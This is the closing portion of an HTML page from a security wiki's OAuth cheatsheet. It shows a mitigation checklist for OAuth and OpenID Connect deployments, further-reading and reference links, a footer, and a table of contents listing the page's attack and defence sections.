+<td><strong>Strict <code>redirect_uri</code></strong></td>
+<td>Allow only exact, pre-registered URIs. No wildcards, partial matches, or open redirects.</td>
+</tr>
+<tr>
+<td><strong>Enforce <code>state</code> &amp; <code>nonce</code></strong></td>
+<td>Generate cryptographically random values. Reject missing or mismatched values.</td>
+</tr>
+<tr>
+<td><strong>Validate all tokens</strong></td>
+<td>Verify <code>iss</code>, <code>aud</code>, <code>exp</code>, <code>nbf</code>, and signatures. Reject <code>alg=none</code>.</td>
+</tr>
+<tr>
+<td><strong>Bind codes &amp; tokens</strong></td>
+<td>Codes must be single-use. Tokens must be bound to client and session.</td>
+</tr>
+<tr>
+<td><strong>Rotate refresh tokens</strong></td>
+<td>Invalidate refresh token on each use. Revoke on logout.</td>
+</tr>
+<tr>
+<td><strong>Verify email ownership</strong></td>
+<td>Require <code>email_verified=true</code> before linking/creating accounts.</td>
+</tr>
+<tr>
+<td><strong>Secure client registration</strong></td>
+<td>Validate all URL fields (<code>logo_uri</code>, <code>jwks_uri</code>). Disable dynamic registration if unused.</td>
+</tr>
+<tr>
+<td><strong>Protect client secrets</strong></td>
+<td>Never expose in frontend, mobile, or public repos. Rotate immediately if leaked.</td>
+</tr>
+<tr>
+<td><strong>Least-privilege scopes</strong></td>
+<td>Minimal scopes, short token lifetimes, explicit scope validation on each request.</td>
+</tr>
+<tr>
+<td><strong>Logging &amp; monitoring</strong></td>
+<td>Log OAuth events — token reuse, failed validations, abnormal patterns.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="good-to-read">
+  Good To Read
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<ul>
+<li><strong>HackerOne Hacktivity</strong>
+<ul>
+<li><a href="https://hackerone.com/reports/1074047" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1074047</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/665651" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/665651</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/1212374" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1212374</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets_draft/OAuth_Cheat_Sheet.md" target="_blank" rel="noreferrer noopener nofollow">https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets_draft/OAuth_Cheat_Sheet.md</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://doyensec.com/resources/Doyensec_OAuth_CheatSheet.pdf" target="_blank" rel="noreferrer noopener nofollow">doyensec_OAuth_Cheat_Sheet</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://pentest.y-security.de/OWASP%20Cheat%20Sheet%20Series/OAuth2_Cheat_Sheet/" target="_blank" rel="noreferrer noopener nofollow">Y-Security performs Attack Simulations, Penetration Tests, and Security Trainings</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://pragmaticwebsecurity.com/files/cheatsheets/oauth2securityfordevelopers.pdf[Authentication" target="_blank" rel="noreferrer noopener nofollow">https://pragmaticwebsecurity.com/files/cheatsheets/oauth2securityfordevelopers.pdf[Authentication</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> Cheatsheet - DEV Community](<a href="https://dev.to/balajisasikumar/authentication-cheatsheet-35lp" target="_blank" rel="noreferrer noopener nofollow">https://dev.to/balajisasikumar/authentication-cheatsheet-35lp</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">)</li>
+<li><a href="https://www.rfc-editor.org/rfc/rfc6749" target="_blank" rel="noreferrer noopener nofollow">RFC 6749: The OAuth 2.0 Authorization Framework</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://assets.ctfassets.net/2ntc334xpx65/7D1vaJ4Q908Th0iklEkFWs/d4a6ebeb2814000214da88a224c9b2f4/OAuth_2.0_and_OpenID_Connect__The_Professional_Guide_Feb6.pdf" target="_blank" rel="noreferrer noopener nofollow">OAuth_2.0_and_OpenID_Connect__The_Professional_Guide_Feb6.pdf</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/OAuth%20Cheatsheet.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#oauth-open-authorization">OAuth (Open Authorization)</a>
+      <ul>
+        <li><a href="#fundamentals-of-oauth">Fundamentals Of OAuth</a></li>
+        <li><a href="#the-types-of-oauth-flows">The types of Oauth Flows:</a>
+          <ul>
+            <li><a href="#1-authorization-code-flow">1. Authorization Code Flow</a></li>
+            <li><a href="#2-authorization-code-flow-with-pkce">2. <strong>Authorization Code Flow with PKCE</strong></a></li>
+            <li><a href="#3-implicit-flow">3. Implicit flow</a></li>
+            <li><a href="#4-client-credentials-flow"><strong>4.</strong> Client Credentials Flow</a></li>
+            <li><a href="#5-resource-owner-password-credentials-ropc-flow">5. Resource Owner Password Credentials (ROPC) Flow</a></li>
+            <li><a href="#6-device-authorization-flow-device-code-flow">6. Device Authorization Flow (Device Code Flow)</a></li>
+          </ul>
+        </li>
+        <li><a href="#oauth-attack-surface">OAuth Attack Surface</a></li>
+        <li><a href="#exploiting-oauth">Exploiting OAuth</a>
+          <ul>
+            <li><a href="#1-authentication-bypass-via-oauth-implicit-flow">1. Authentication Bypass via OAuth Implicit Flow</a></li>
+            <li><a href="#2-oauth-account-hijacking-via-redirect_uri-manipulation">2. OAuth Account Hijacking via <code>redirect_uri</code> Manipulation</a></li>
+            <li><a href="#3-forced-oauth-profile-linking">3. Forced OAuth Profile Linking</a></li>
+            <li><a href="#4-stealing-oauth-access-tokens-via-open-redirect">4. Stealing OAuth Access Tokens via Open Redirect</a></li>
+            <li><a href="#5-stealing-oauth-access-tokens-via-proxy-page">5. Stealing OAuth Access Tokens via Proxy Page</a></li>
+            <li><a href="#6-ssrf-via-openid-dynamic-client-registration">6. SSRF via OpenID Dynamic Client Registration</a></li>
+            <li><a href="#7-login-csrf-via-missing-state-parameter">7. Login CSRF via Missing <code>state</code> Parameter</a></li>
+            <li><a href="#8-authorization-code-replay">8. Authorization Code Replay</a></li>
+            <li><a href="#9-oauth-token-substitution-attack">9. OAuth Token Substitution Attack</a></li>
+            <li><a href="#10-email-trust-abuse-in-oauth-login">10. Email Trust Abuse in OAuth Login</a></li>
+            <li><a href="#11-id-token-claim-manipulation-oidc">11. ID Token Claim Manipulation (OIDC)</a></li>
+            <li><a href="#12-missing-pkce-leading-to-code-interception">12. Missing PKCE Leading to Code Interception</a></li>
+            <li><a href="#13-refresh-token-reuse-without-rotation">13. Refresh Token Reuse Without Rotation</a></li>
+            <li><a href="#14-oauth-discovery-endpoint-poisoning">14. OAuth Discovery Endpoint Poisoning</a></li>
+            <li><a href="#15-client-impersonation-via-leaked-client-credentials">15. Client Impersonation via Leaked Client Credentials</a></li>
+          </ul>
+        </li>
+        <li><a href="#oauth-bypasses--obfuscation">OAuth Bypasses &amp; Obfuscation</a>
+          <ul>
+            <li><a href="#1-redirect_uri-bypass-techniques">1. <code>redirect_uri</code> Bypass Techniques</a></li>
+            <li><a href="#2-state-parameter-bypass">2. State Parameter Bypass</a></li>
+            <li><a href="#3-scope-escalation">3. Scope Escalation</a></li>
+          </ul>
+        </li>
+        <li><a href="#additional-advanced-attack-scenarios">Additional Advanced Attack Scenarios</a>
+          <ul>
+            <li><a href="#1-pkce-downgrade-attack">1. PKCE Downgrade Attack</a></li>
+            <li><a href="#2-oauth-logout-csrf">2. OAuth Logout CSRF</a></li>
+            <li><a href="#3-token-leakage-via-referer-header">3. Token Leakage via Referer Header</a></li>
+            <li><a href="#4-framework-specific-misconfigurations">4. Framework-Specific Misconfigurations</a></li>
+          </ul>
+        </li>
+        <li><a href="#test-cases">Test Cases</a></li>
+        <li><a href="#detection-techniques">Detection Techniques</a>
+          <ul>
+            <li><a href="#a-manual-detection">A. Manual Detection</a></li>
+            <li><a href="#b-automated-detection">B. Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact-of-oauth--sso-attacks">Impact of OAuth &amp; SSO Attacks</a></li>
+        <li><a href="#remediation-for-oauth--sso-vulnerabilities">Remediation for OAuth &amp; SSO Vulnerabilities</a></li>
+        <li><a href="#mitigation--prevention">Mitigation &amp; Prevention</a></li>
+        <li><a href="#good-to-read">Good To Read</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
